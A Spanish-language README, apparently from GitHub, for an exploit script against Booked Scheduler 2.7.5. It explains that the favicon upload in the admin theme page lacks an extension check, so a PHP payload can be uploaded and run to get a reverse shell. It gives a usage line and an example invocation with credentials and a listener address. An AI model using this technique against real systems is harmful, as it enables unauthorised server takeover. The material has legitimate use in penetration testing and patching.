# Booked Scheduler v2.7.5 Remote Command Execution

## Descripción
Este exploit aprovecha una vulnerabilidad de carga de archivos de Booked 2.7.5
En la sección **"Look and Feel"** `/booked/Web/admin/manage_theme.php`, se pueden modificar los archivos Logo-Favicon-CSS.
Las secciones de subida tienen control de la extensión del archivo, excepto la parte del favicon.
Puedes subir el archivo con la extensión que quieras a través del campo Favicon.
El archivo que subes se escribe en el directorio principal del sitio `/booked/Web/custom-favicon.php` con el nombre "custom-favicon".
Después de subir el payload php al directorio principal, el Exploit ejecuta el payload y recibe el shell.

## Uso
```python
 python3 bookedScheduler.py <target ip> <target port> <user> <password> <local ip> <local port>
```
## EJEMPLO:
```python
 python3 bookedScheduler.py 192.168.88.64 8003 "admin" "adminadmin" 192.168.88.64 22
```
![bookedExploit](https://github.com/hacknotes/Booked-Scheduler-v2.7.5-Remote-Command-Execution/blob/main/booked.png)
